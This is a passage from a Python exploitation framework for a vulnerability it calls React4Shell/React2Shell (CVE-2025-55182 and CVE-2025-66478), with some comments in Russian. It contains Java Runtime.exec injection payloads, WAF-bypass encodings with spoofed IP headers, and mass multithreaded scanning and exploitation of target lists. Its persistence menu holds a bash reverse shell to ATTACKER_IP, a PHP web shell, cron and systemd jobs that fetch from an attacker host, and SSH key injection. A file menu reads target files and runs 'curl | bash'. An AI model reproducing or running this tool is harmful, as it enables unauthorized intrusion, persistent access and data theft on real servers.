            if response_time > baseline_time + 2:  # More than 2 seconds longer
                print(f"    [+] Possible blind RCE: Response took {response_time:.2f}s (baseline: {baseline_time:.2f}s)")
                return True
            else:
                print(f"    [-] No delay: {response_time:.2f}s")
                
        except requests.exceptions.Timeout:
            print(f"    [+] Timeout - possible blind RCE!")
            return True
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    # Test 2: DNS/HTTP callback test
    print("\n[+] Test 2: Trying to trigger external callback")
    
    # Generate random subdomain
    random_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    test_domains = [
        f"{random_token}.oastify.com",
        f"{random_token}.burpcollaborator.net"
    ]
    
    for domain in test_domains:
        dns_cmd = f"nslookup {domain} || dig {domain} || ping -c 1 {domain}"
        print(f"  Testing DNS callback to: {domain}")
        
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{dns_cmd}\\")}}}}"}}'
        
        try:
            if method.upper() == 'GET':
                params = {"query": payload}
                response = session.get(endpoint, params=params, headers=headers, timeout=5)
            else:
                response = session.post(endpoint, data=payload, headers=headers, timeout=5)
            
            print(f"    Request sent. Check your collaborator for callbacks.")
            time.sleep(2)
            
        except:
            pass
    
    return False

def aggressive_waf_bypass(target_url, endpoint, method='POST', payload_template=None, command="id"):
    """
    Aggressive WAF bypass techniques for React4Shell exploitation
    """
    print(f"\n[+] Starting aggressive WAF bypass on {target_url}")
    print(f"[+] Endpoint: {endpoint}")
    print(f"[+] Command: {command}")
    
    results = []
    
    # Define bypass techniques
    bypass_techniques = [
        {
            "name": "Double URL Encoding",
            "headers": {"Content-Type": "application/json"},
            "encoder": lambda cmd: f'{{"query": "%257B%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2522{cmd}%2522%2529%257D%257D"}}'
        },
        {
            "name": "Unicode Escape",
            "headers": {"Content-Type": "application/json"},
            "encoder": lambda cmd: f'{{"qu\\u0065ry": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        },
        {
            "name": "Mixed Case Headers",
            "headers": {"cOnTeNt-TyPe": "application/json", "User-Agent": "Mozilla/5.0"},
            "encoder": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        },
        {
            "name": "Null Bytes",
            "headers": {"Content-Type": "application/json"},
            "encoder": lambda cmd: f'{{"query\\x00": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        },
        {
            "name": "Extra Whitespace",
            "headers": {"Content-Type": "application/json"},
            "encoder": lambda cmd: f'{{\n\t"query":\n\t"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"\n}}'
        },
        {
            "name": "JSON Wrapped",
            "headers": {"Content-Type": "application/json"},
            "encoder": lambda cmd: f'{{"data":{{"query":"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}}}'
        },
        {
            "name": "Form URL Encoded",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "encoder": lambda cmd: f'query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D'
        },
        {
            "name": "XML Content-Type",
            "headers": {"Content-Type": "application/xml"},
            "encoder": lambda cmd: f'<query>{{{{T(java.lang.Runtime).getRuntime().exec("{cmd}")}}}}</query>'
        },
        {
            "name": "Multiple Content-Type",
            "headers": {"Content-Type": "application/json, text/plain"},
            "encoder": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        },
        {
            "name": "Chunked Encoding",
            "headers": {"Content-Type": "application/json", "Transfer-Encoding": "chunked"},
            "encoder": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
        }
    ]
    
    # Additional HTTP methods to try
    http_methods = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']
    
    session = create_stealth_session()
    
    print(f"[+] Testing {len(bypass_techniques)} bypass techniques with {len(http_methods)} HTTP methods...")
    
    for method in http_methods:
        for technique in bypass_techniques:
            if interrupted:
                return results
            
            try:
                # Prepare payload
                payload = technique["encoder"](command)
                
                # Prepare headers
                headers = get_random_headers()
                headers.update(technique["headers"])
                
                # Add bypass-specific headers
                if "X-Forwarded-For" not in headers:
                    headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # Add referer to look legitimate
                headers["Referer"] = target_url
                
                # Add additional headers
                headers["X-Real-IP"] = headers["X-Forwarded-For"]
                headers["CF-Connecting-IP"] = headers["X-Forwarded-For"]
                
                # Send request
                if method == 'GET':
                    # For GET, send as parameters
                    import urllib.parse
                    if technique["headers"].get("Content-Type") == "application/x-www-form-urlencoded":
                        # Parse form data
                        params = {}
                        for pair in payload.split('&'):
                            if '=' in pair:
                                key, value = pair.split('=', 1)
                                params[key] = value
                        response = session.get(endpoint, params=params, headers=headers, timeout=8)
                    else:
                        # Try to send as query parameter
                        params = {"query": payload}
                        response = session.get(endpoint, params=params, headers=headers, timeout=8)
                else:
                    # For other methods
                    response = session.request(
                        method=method,
                        url=endpoint,
                        data=payload,
                        headers=headers,
                        timeout=8
                    )
                
                # Check response
                if response.status_code != 403 and response.status_code != 401:
                    print(f"\n[!] SUCCESS: {method} + {technique['name']} - Status: {response.status_code}")
                    
                    # Check for command output indicators
                    output_indicators = ['uid=', 'gid=', 'root:', 'bin/', 'etc/', 'home/', 'total ', 'drwx']
                    found_indicators = []
                    
                    for indicator in output_indicators:
                        if indicator in response.text.lower():
                            found_indicators.append(indicator)
                    
                    if found_indicators:
                        print(f"[!] Command output detected: {', '.join(found_indicators)}")
                    
                    # Show response preview
                    preview = response.text[:500]
                    print(f"[+] Response preview:\n{'-'*50}")
                    print(preview)
                    if len(response.text) > 500:
                        print(f"... [truncated, total: {len(response.text)} chars]")
                    print(f"{'-'*50}")
                    
                    results.append({
                        'technique': technique['name'],
                        'method': method,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'indicators': found_indicators,
                        'response_preview': preview
                    })
                    
                    # If we got a 200 with indicators, this might be successful
                    if response.status_code == 200 and found_indicators:
                        print(f"\n[+] POTENTIAL EXPLOIT SUCCESS with {technique['name']}!")
                        return results
                
                # Small delay between attempts
                time.sleep(random.uniform(0.2, 0.8))
                
            except Exception as e:
                # Silently continue on errors
                continue
    
    if results:
        print(f"\n[+] Found {len(results)} potential bypasses")
        print(f"[+] Best results:")
        for i, result in enumerate(results[:3], 1):
            print(f"  {i}. {result['technique']} ({result['method']}) - Status: {result['status_code']}")
            if result['indicators']:
                print(f"     Indicators: {', '.join(result['indicators'])}")
    else:
        print(f"\n[-] No successful bypasses found")
    
    return results

def exploit_vulnerability(target_url, endpoint, method='POST', payload_template=None, command="id", aggressive=False):
    """
    Exploit React4Shell vulnerability on a specific target
    """
    print(f"\n[+] Attempting to exploit {target_url}")
    print(f"[+] Endpoint: {endpoint}")
    print(f"[+] Method: {method}")
    print(f"[+] Command: {command}")
    
    # Если агрессивный режим, используй WAF bypass
    if aggressive:
        return aggressive_waf_bypass(target_url, endpoint, method, payload_template, command)
    
    # Create stealth session
    session = create_stealth_session()
    headers = get_random_headers()
    
    # Generate a unique marker to distinguish real output from HTML
    unique_marker = f"RCE_OUTPUT_{random.randint(10000, 99999)}"
    full_command = f"echo '{unique_marker}' && {command} && echo '{unique_marker}'"
    
    payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{full_command}\\")}}}}"}}'
    
    if payload_template and payload_template != 'N/A':
        try:
            pattern = r'exec\\(\\"([^\\"]*)\\"\\)'
            match = re.search(pattern, payload_template)
            if match:
                old_cmd = match.group(1)
                new_payload = payload_template.replace(old_cmd, full_command)
                payload = new_payload
                print(f"[+] Using adapted payload from scan")
        except:
            pass
    
    try:
        if method.upper() == 'GET':
            params = {"query": payload}
            response = session.get(endpoint, params=params, headers=headers)
        else:
            if 'Content-Type' not in headers:
                headers['Content-Type'] = 'application/json'
            response = session.post(endpoint, data=payload, headers=headers)
        
        print(f"\n[+] Exploitation Results:")
        print(f"    Status Code: {response.status_code}")
        print(f"    Response Time: {response.elapsed.total_seconds():.2f}s")
        print(f"    Response Size: {len(response.text)} chars")
        
        # Check for unique marker first (real RCE proof)
        if unique_marker in response.text:
            print(f"\n[!] REAL RCE CONFIRMED: Found unique marker '{unique_marker}'!")
            
            # Extract output between markers
            pattern = f"{unique_marker}(.*?){unique_marker}"
            match = re.search(pattern, response.text, re.DOTALL)
            if match:
                command_output = match.group(1).strip()
                print(f"\n[+] Command Output:")
                print("-" * 50)
                print(command_output[:2000])
                if len(command_output) > 2000:
                    print(f"... [truncated, total: {len(command_output)} chars]")
                print("-" * 50)
                return True
        else:
            print(f"[-] Unique marker '{unique_marker}' NOT found - may be false positive")
        
        # Legacy detection (prone to false positives)
        legacy_indicators = ['uid=', 'gid=', 'root:', '/bin/', 'etc/passwd']
        found_legacy = False
        
        for indicator in legacy_indicators:
            if indicator in response.text:
                print(f"[!] WARNING: Found '{indicator}' - could be false positive in HTML")
                found_legacy = True
        
        if not found_legacy:
            print(f"[-] No legacy indicators found")
        
        # Show response preview
        print(f"\n[+] Response Preview (first 500 chars):")
        print("-" * 50)
        preview = response.text[:500]
        print(preview)
        if len(response.text) > 500:
            print(f"... [truncated, total: {len(response.text)} chars]")
        print("-" * 50)
        
        # Check if it's just HTML error page
        html_indicators = ['<!DOCTYPE html>', '<html', '<head>', '<script>', '<body>']
        html_count = sum(1 for indicator in html_indicators if indicator in preview)
        
        if html_count >= 2:
            print(f"\n[!] CAUTION: Response appears to be HTML error page, not command output")
            print(f"[!] This is likely a FALSE POSITIVE - use option 4 to verify")
        
        return False
        
    except Exception as e:
        print(f"[!] Exploitation failed: {str(e)}")
        return None

def find_working_endpoint(target_url):
    """
    Быстрый поиск рабочих GraphQL/API endpoints
    """
    print(f"[+] Searching for working endpoints on {target_url}")
    
    # Основные endpoints для быстрой проверки
    quick_endpoints = ENDPOINTS[:20] + CVE_ENDPOINTS[:10]
    
    session = create_stealth_session()
    headers = get_random_headers()
    probe_payload = '{"query": "test"}'
    
    working_endpoints = []
    
    for endpoint in quick_endpoints:
        if interrupted:
            break
            
        try:
            url = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint.lstrip('/'))
            
            # Пробуем GET сначала
            try:
                get_resp = session.get(url, headers=headers, timeout=3)
                if get_resp.status_code in [200, 400, 401, 403, 500]:
                    content_type = get_resp.headers.get('Content-Type', '').lower()
                    if 'application/json' in content_type or 'graphql' in get_resp.text.lower():
                        working_endpoints.append({
                            'url': url,
                            'method': 'GET',
                            'status': get_resp.status_code,
                            'type': 'GET endpoint'
                        })
            except:
                pass
            
            # Пробуем POST
            try:
                post_resp = session.post(url, data=probe_payload, headers=headers, timeout=3)
                if post_resp.status_code in [200, 400, 401, 403, 405, 500]:
                    content_type = post_resp.headers.get('Content-Type', '').lower()
                    response_text = post_resp.text.lower()
                    
                    # Проверяем признаки API
                    api_indicators = ['graphql', 'json', 'rest', 'api', 'query']
                    if (any(indicator in response_text for indicator in api_indicators) or 
                        'application/json' in content_type):
                        
                        working_endpoints.append({
                            'url': url,
                            'method': 'POST',
                            'status': post_resp.status_code,
                            'type': 'API endpoint'
                        })
            except:
                pass
            
            time.sleep(0.3)  # Небольшая задержка
            
        except Exception:
            continue
    
    return working_endpoints

def exploit_all_endpoints(target_url, command="id", aggressive=False):
    """
    Эксплуатировать все endpoints из списка ENDPOINTS
    """
    print(f"\n[+] Testing ALL endpoints ({len(ENDPOINTS) + len(CVE_ENDPOINTS)}) on {target_url}")
    print(f"[+] Command: {command}")
    print(f"[+] Aggressive mode: {aggressive}")
    
    results = []
    all_endpoints = list(set(ENDPOINTS + CVE_ENDPOINTS))
    
    # Спросим подтверждение если endpoints много
    if len(all_endpoints) > 20:
        print(f"\n[!] You are about to test {len(all_endpoints)} endpoints")
        confirm = input("[?] Continue? (yes/no): ").strip().lower()
        if confirm not in ['yes', 'y']:
            print("[!] Operation cancelled")
            return results
    
    for i, endpoint_path in enumerate(all_endpoints, 1):
        if interrupted:
            break
            
        try:
            endpoint = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint_path.lstrip('/'))
            print(f"\n[{i}/{len(all_endpoints)}] Testing endpoint: {endpoint_path}")
            
            # Пропускаем некоторые endpoints которые не имеют смысла для POST
            if endpoint_path.endswith('.html') or endpoint_path.endswith('.json'):
                # Для HTML и JSON endpoints пробуем GET
                result = exploit_vulnerability(
                    target_url=target_url,
                    endpoint=endpoint,
                    method='GET',
                    command=command,
                    aggressive=aggressive
                )
            else:
                # Для остальных пробуем POST
                result = exploit_vulnerability(
                    target_url=target_url,
                    endpoint=endpoint,
                    method='POST',
                    command=command,
                    aggressive=aggressive
                )
            
            if result:
                results.append({
                    'endpoint': endpoint,
                    'result': result
                })
            
            # Задержка между запросами
            time.sleep(0.5)
            
        except Exception as e:
            print(f"[!] Error testing {endpoint_path}: {str(e)[:50]}")
            continue
    
    return results

def establish_persistence(target_url, endpoint, method='POST', payload_template=None):
    """
    Establish persistence in the compromised system
    """
    print(f"\n[+] Establishing persistence on {target_url}")
    
    persistence_methods = [
        {
            "name": "Reverse Shell (Netcat)",
            "command": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",
            "description": "Change ATTACKER_IP to your IP"
        },
        {
            "name": "Web Shell Upload",
            "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/shell.php",
            "description": "Simple PHP web shell"
        },
        {
            "name": "Cron Job Persistence",
            "command": "echo '* * * * * curl http://ATTACKER_IP/cron.sh | bash' >> /tmp/cronjob && crontab /tmp/cronjob",
            "description": "Change ATTACKER_IP to your server"
        },
        {
            "name": "SSH Key Injection",
            "command": "mkdir -p ~/.ssh && echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys",
            "description": "Replace with your SSH public key"
        },
        {
            "name": "SystemD Service",
            "command": "echo '[Unit]\\nDescription=Persistence\\n\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c \"while true; do curl http://ATTACKER_IP/checkin; sleep 300; done\"\\n\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/persist.service && systemctl enable persist.service",
            "description": "Change ATTACKER_IP"
        }
    ]
    
    # Сначала проверим окружение
    print("[+] Checking environment...")
    
    check_commands = [
        ("whoami", "Current user"),
        ("id", "User privileges"),
        ("uname -a", "System info"),
        ("pwd", "Current directory"),
        ("ls -la", "Directory listing"),
        ("cat /etc/passwd | head -5", "System users"),
        ("ps aux | head -10", "Running processes"),
        ("which python python3 java php curl wget nc netcat", "Available tools")
    ]
    
    for cmd, desc in check_commands:
        print(f"\n[+] {desc}: {cmd}")
        exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        time.sleep(1)
    
    # Предложим методы закрепления
    print("\n" + "=" * 70)
    print("PERSISTENCE METHODS")
    print("=" * 70)
    
    for i, method in enumerate(persistence_methods, 1):
        print(f"{i}. {method['name']}")
        print(f"   {method['description']}")
        print(f"   Command: {method['command'][:80]}...")
    
    print("\nSelect method number to execute, or 'custom' for custom command:")
    choice = input("> ").strip()
    
    if choice.lower() == 'custom':
        custom_cmd = input("Enter custom persistence command: ")
        exploit_vulnerability(target_url, endpoint, method, payload_template, custom_cmd)
    elif choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(persistence_methods):
            selected = persistence_methods[idx]
            print(f"\n[+] Executing: {selected['name']}")
            
            # Для некоторых методов нужна дополнительная информация
            if "ATTACKER_IP" in selected['command']:
                attacker_ip = input("Enter your attacker IP: ").strip()
                cmd = selected['command'].replace("ATTACKER_IP", attacker_ip)
                
                if "YOUR_PUBLIC_KEY" in cmd:
                    pub_key = input("Paste your SSH public key: ").strip()
                    cmd = cmd.replace("YOUR_PUBLIC_KEY", pub_key)
            else:
                cmd = selected['command']
            
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
            
            # Для reverse shell, подскажем как слушать
            if "netcat" in cmd.lower() or "dev/tcp" in cmd.lower():
                print("\n[+] To catch reverse shell, run on your machine:")
                print(f"    nc -lvnp 4444")
        else:
            print("[!] Invalid selection")
    else:
        print("[!] Invalid input")

def file_operations_menu(target_url, endpoint, method='POST', payload_template=None):
    """
    File operations for post-exploitation
    """
    while True:
        print("\n" + "=" * 50)
        print("FILE OPERATIONS")
        print("=" * 50)
        print("1. Read file")
        print("2. Write file")
        print("3. Execute local script")
        print("4. Download file to server")
        print("5. Upload file from server")
        print("6. Back")
        
        choice = input("\nSelect > ").strip()
        
        if choice == '1':
            file_path = input("Enter file path to read: ").strip()
            cmd = f"cat {file_path}"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        
        elif choice == '2':
            file_path = input("Enter file path to write: ").strip()
            content = input("Enter content (use \\n for new lines): ").strip()
            # Escape quotes and special characters
            content = content.replace('"', '\\"').replace('$', '\\$')
            cmd = f'echo "{content}" > {file_path}'
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        
        elif choice == '3':
            script_url = input("Enter script URL to download and execute: ").strip()
            cmd = f"curl -s {script_url} | bash"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        
        elif choice == '4':
            remote_file = input("Enter remote file URL to download: ").strip()
            local_path = input("Enter local path to save: ").strip()
            cmd = f"curl -s {remote_file} -o {local_path}"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        
        elif choice == '5':
            # Create simple download server command
            print("\n[+] To upload file from server, first start HTTP server on your machine:")
            print("    python3 -m http.server 8080")
            print("\nThen run download command on target:")
            server_ip = input("Enter your server IP: ").strip()
            filename = input("Enter filename on your server: ").strip()
            save_path = input("Enter save path on target: ").strip()
            cmd = f"curl http://{server_ip}:8080/{filename} -o {save_path}"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        
        elif choice == '6':
            break

def interactive_exploitation_menu(vulnerabilities):
    """
    Interactive menu for selecting a vulnerability to exploit
    """
    if not vulnerabilities:
        print("[!] No vulnerabilities available for exploitation")
        return None
    
    print("\n" + "=" * 70)
    print("EXPLOITATION MENU")
    print("=" * 70)
    
    # Display vulnerabilities
    for i, vuln in enumerate(vulnerabilities, 1):
        status = vuln.get('vulnerable', 'Unknown')
        url = vuln.get('url', 'N/A')
        endpoint = vuln.get('endpoint', 'N/A')
        print(f"{i}. [{status}] {url}")
        print(f"   Endpoint: {endpoint}")
    
    print("\nCommands:")
    print("  [number]  - Select vulnerability to exploit")
    print("  back      - Return to main menu")
    print("  exit      - Exit program")
    
    while True:
        choice = input("\nSelect > ").strip().lower()
        
        if choice == 'back':
            return None
        elif choice == 'exit':
            print("[+] Exiting...")
            sys.exit(0)
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(vulnerabilities):
                return vulnerabilities[idx]
            else:
                print("[!] Invalid selection")
        else:
            print("[!] Invalid input")

def exploitation_command_menu():
    """
    Menu for selecting exploitation command
    """
    print("\n" + "=" * 50)
    print("EXPLOITATION COMMANDS")
    print("=" * 50)
    
    commands = list(EXPLOIT_PAYLOADS.keys())
    for i, cmd in enumerate(commands, 1):
        if cmd == "custom":
            print(f"{i}. {cmd} - Enter custom command")
        else:
            print(f"{i}. {cmd}")
    
    print("\nOr enter custom command directly")
    
    while True:
        choice = input("\nSelect command (number or command) > ").strip().lower()
        
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(commands):
                return commands[idx]
            else:
                print("[!] Invalid selection")
        elif choice in commands:
            return choice
        elif choice in ['back', 'exit']:
            return choice
        else:
            # Treat as custom command
            print(f"[+] Will use custom command: {choice}")
            # Create custom payload
            EXPLOIT_PAYLOADS['custom_temp'] = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{choice}\\")}}}}"}}'
            return choice

def load_report_and_exploit(report_file):
    """
    Load a report file and allow exploitation of found vulnerabilities
    """
    try:
        with open(report_file, 'r') as f:
            report = json.load(f)
        
        results = report.get('results', [])
        vulnerabilities = [r for r in results if r.get('vulnerable')]
        
        if not vulnerabilities:
            print(f"[!] No vulnerabilities found in report: {report_file}")
            return
        
        print(f"\n[+] Loaded report: {report_file}")
        print(f"[+] Found {len(vulnerabilities)} vulnerabilities")
        
        # Interactive exploitation loop
        while True:
            vuln = interactive_exploitation_menu(vulnerabilities)
            if not vuln:
                break
            
            # Select command
            cmd_choice = exploitation_command_menu()
            if cmd_choice in ['back', 'exit']:
                if cmd_choice == 'exit':
                    print("[+] Exiting...")
                    sys.exit(0)
                continue
            
            # Execute exploitation
            exploit_vulnerability(
                target_url=vuln.get('url'),
                endpoint=vuln.get('endpoint'),
                method=vuln.get('method', 'POST'),
                payload_template=vuln.get('payload_used'),
                command=cmd_choice
            )
            
            # Ask if user wants to continue
            cont = input("\nContinue exploitation? (yes/no): ").strip().lower()
            if cont not in ['yes', 'y']:
                break
    
    except FileNotFoundError:
        print(f"[!] Report file not found: {report_file}")
    except json.JSONDecodeError:
        print(f"[!] Invalid JSON in report file: {report_file}")
    except Exception as e:
        print(f"[!] Error loading report: {str(e)}")

def mass_cve_scan(input_file, output_file="cve_results.txt", threads=None):
    """
    Mass CVE scanning across multiple targets with multithreading support
    """
    try:
        with open(input_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]

        if not targets:
            print("[!] No targets provided for CVE scan")
            return

        default_workers = max(2, min(os.cpu_count() or 4, 16))
        max_workers = threads if threads else default_workers
        max_workers = min(max_workers, len(targets))

        print(f"\n[+] Starting mass CVE scan on {len(targets)} targets using {max_workers} threads")

        scan_results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_target = {executor.submit(cve_specific_scan, target): target for target in targets}

            for completed, future in enumerate(concurrent.futures.as_completed(future_to_target), start=1):
                target = future_to_target[future]
                try:
                    result = future.result()
                except Exception as e:
                    print(f"[!] Error scanning {target}: {e}")
                    result = None

                scan_results.append((target, result))
                print(f"[{completed}/{len(targets)}] Finished scanning {target}")

        with open(output_file, 'w') as out_f:
            out_f.write("CVE Scan Results\n")
            out_f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            out_f.write("="*50 + "\n")

            for target, results in scan_results:
                if results:
                    out_f.write(f"\nTarget: {target}\n")
                    for result in results:
                        out_f.write(f"  - {result['cve']}: {result['endpoint']}\n")
                        out_f.write(f"    Evidence: {result['evidence']}\n")
                    out_f.write("\n")
                else:
                    out_f.write(f"\nTarget: {target} - No CVE vulnerabilities found\n")

        print(f"\n[+] Results saved to {output_file}")

    except Exception as e:
        print(f"[!] Error: {e}")

def main_scan_mode(input_file, output_prefix, threads=None):
    """Main scanning function"""
    global interrupted
    
    # Read URLs
    try:
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except:
        print(f"[!] Could not read file: {input_file}")
        sys.exit(1)
    
    print(f"[*] Ultimate React4Shell Scanner Started")
    print(f"[*] React2Shell multipart probes: Enabled")
    # Use thread pool with configurable worker count
    default_workers = max(2, min(os.cpu_count() or 4, 16))
    max_workers = threads if threads else default_workers
    max_workers = min(max_workers, len(urls)) if urls else 1

    print(f"[*] Targets: {len(urls)}")
    print(f"[*] CVE-2025-55182 & CVE-2025-66478 Support: Enabled")
    print(f"[*] WAF Bypass Techniques: Enabled")
    print(f"[*] Rotating Headers: {len(USER_AGENTS)} user agents")
    print(f"[*] Payload Variations: {len(PAYLOADS)}")
    print(f"[*] Endpoints to test: {len(ENDPOINTS) + len(CVE_ENDPOINTS)}")
    print(f"[*] Stealth Mode: Random delays enabled")
    print(f"[*] Thread workers: {max_workers}")
    print(f"[*] Press Ctrl+C to stop and save partial results")
    print("-" * 50)

    results = []
    scanned = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        
        # Submit all tasks
        for url in urls:
            if interrupted:
                break
            future = executor.submit(check_react4shell, url)
            futures[future] = url
        
        # Process results as they complete
        for future in concurrent.futures.as_completed(futures):
            if interrupted:
                break
                
            url = futures[future]
            scanned += 1
            
            try:
                result = future.result(timeout=15)
                results.extend(result)
                
                # Show progress with more detail
                vuln_status = "safe"
                for r in result:
                    if r.get('vulnerable') == 'Confirmed':
                        vuln_status = "CONFIRMED"
                        break
                    elif r.get('vulnerable') == 'Potential':
                        vuln_status = "POTENTIAL"
                
                print(f"[{scanned}/{len(urls)}] {vuln_status} - {url[:50]}...")
                
            except concurrent.futures.TimeoutError:
                results.append({
                    'url': url,
                    'vulnerable': False,
                    'evidence': 'Timeout (WAF may be blocking)',
                    'timestamp': datetime.now().isoformat()
                })
                print(f"[{scanned}/{len(urls)}] TIMEOUT - {url[:50]}...")
            except Exception as e:
                results.append({
                    'url': url,
                    'vulnerable': False,
                    'evidence': f'Error: {str(e)[:50]}',
                    'timestamp': datetime.now().isoformat()
                })
                print(f"[{scanned}/{len(urls)}] ERROR   - {url[:50]}...")
    
    # Generate report
    print("\n" + "=" * 50)
    if interrupted:
        print(f"[!] Scan interrupted after {scanned} targets")
    else:
        print(f"[*] Scan completed: {scanned} targets")
    
    print(f"[*] Generating enhanced reports...")
    report = generate_report(results, output_prefix)
    
    print(f"[+] Report saved to: {output_prefix}.txt")
    print(f"[+] JSON data saved to: {output_prefix}.json")
    
    if report:
        vulnerabilities = [r for r in results if r.get('vulnerable')]
        if vulnerabilities:
            print(f"\n[!] Found {len(vulnerabilities)} vulnerabilities!")
            
            # Ask if user wants to exploit
            exploit_now = input("\nDo you want to exploit one of the vulnerabilities now? (yes/no): ").strip().lower()
            if exploit_now in ['yes', 'y']:
                load_report_and_exploit(f"{output_prefix}.json")
        else:
            print(f"\n[*] No vulnerabilities found in scanned targets")
    
    return report

def main_menu():
    """Interactive main menu"""
    print("\n" + "=" * 70)
    print("ULTIMATE REACT4SHELL / REACT2SHELL FRAMEWORK")
    print("CVE-2025-55182 & CVE-2025-66478 Ready")
    print("=" * 70)
    print("\nOptions:")
    print("  1. Scan new targets")
    print("  2. Load and exploit from existing report")
    print("  3. Direct exploitation (manual target)")
    print("  4. Verify RCE (check if exploit is real)")
    print("  5. Aggressive exploitation (WAF bypass)")
    print("  6. CVE-specific scan (2025-55182 & 2025-66478)")
    print("  7. Hybrid exploitation (all techniques)")
    print("  8. Advanced persistence")
    print("  9. File operations")
    print("  10. Mass CVE scanning")
    print("  11. Scan single target (detailed)")
    print("  12. Post-exploitation (for confirmed RCE)")
    print("  13. Exit")
    
    while True:
        choice = input("\nSelect option > ").strip()
        
        if choice == '1':
            input_file = input("Enter path to targets file: ").strip()
            output_prefix = input("Enter output prefix (e.g., 'scan_results'): ").strip()
            threads_input = input("Threads to use (press enter for auto): ").strip()
            threads = int(threads_input) if threads_input.isdigit() and int(threads_input) > 0 else None
            if input_file and output_prefix:
                main_scan_mode(input_file, output_prefix, threads=threads)
            else:
                print("[!] Invalid input")
        
        elif choice == '2':
            report_file = input("Enter path to report JSON file: ").strip()
            if report_file:
                load_report_and_exploit(report_file)
            else:
                print("[!] Invalid input")
        
        elif choice == '3':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (press enter for auto-detection): ").strip()
            command = input("Enter command to execute (default: id): ").strip() or "id"
            
            if target_url:
                if not endpoint:
                    # Автоматический поиск рабочих endpoints
                    print("[+] Auto-detecting working endpoints...")
                    working_endpoints = find_working_endpoint(target_url)
                    
                    if working_endpoints:
                        print(f"[+] Found {len(working_endpoints)} working endpoints:")
                        for i, ep in enumerate(working_endpoints, 1):
                            print(f"  {i}. {ep['url']} ({ep['method']})")
                        
                        # Спросить пользователя
                        print("\nOptions:")
                        print("  [number] - Test specific endpoint")
                        print("  all      - Test ALL endpoints")
                        print("  quick    - Try common endpoints only")
                        
                        endpoint_choice = input("\nSelect> ").strip().lower()
                        
                        if endpoint_choice == 'all':
                            # Тестировать все endpoints
                            exploit_all_endpoints(target_url, command)
                        elif endpoint_choice == 'quick':
                            # Тестировать только common endpoints
                            common_endpoints = [
                                "/api/graphql",
                                "/graphql",
                                "/api/rest",
                                "/api/v1/graphql",
                                "/graphql-api",
                                "/api"
                            ]
                            for endpoint_path in common_endpoints:
                                endpoint_url = urllib.parse.urljoin(target_url.rstrip('/') + '/', endpoint_path.lstrip('/'))
                                print(f"\n[+] Testing: {endpoint_url}")
                                exploit_vulnerability(
                                    target_url=target_url,
                                    endpoint=endpoint_url,
                                    command=command
                                )
                                cont = input("\nContinue to next endpoint? (yes/no): ").strip().lower()
                                if cont not in ['yes', 'y']:
                                    break
                        elif endpoint_choice.isdigit():
                            idx = int(endpoint_choice) - 1
                            if 0 <= idx < len(working_endpoints):
                                ep = working_endpoints[idx]
                                exploit_vulnerability(
                                    target_url=target_url,
                                    endpoint=ep['url'],
                                    method=ep.get('method', 'POST'),
                                    command=command
                                )
                            else:
                                print("[!] Invalid selection")
                        else:
                            print("[!] Invalid input")
                    else:
                        # Не найдено рабочих endpoints, пробуем все
                        print("[-] No working endpoints found. Testing all endpoints...")
                        exploit_all_endpoints(target_url, command)
                else:
                    # Пользователь указал endpoint
                    exploit_vulnerability(
                        target_url=target_url,
                        endpoint=endpoint,
                        command=command
                    )
            else:
                print("[!] Target URL required")
        
        elif choice == '4':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (press enter for auto-detection): ").strip()
            
            if target_url:
                if not endpoint:
                    endpoint = target_url.rstrip('/') + '/api/graphql'
                
                print(f"\n[!] WARNING: Your previous 'success' may be false positive!")
                print(f"[!] The 'uid=' indicator appeared in HTML error page, not command output")
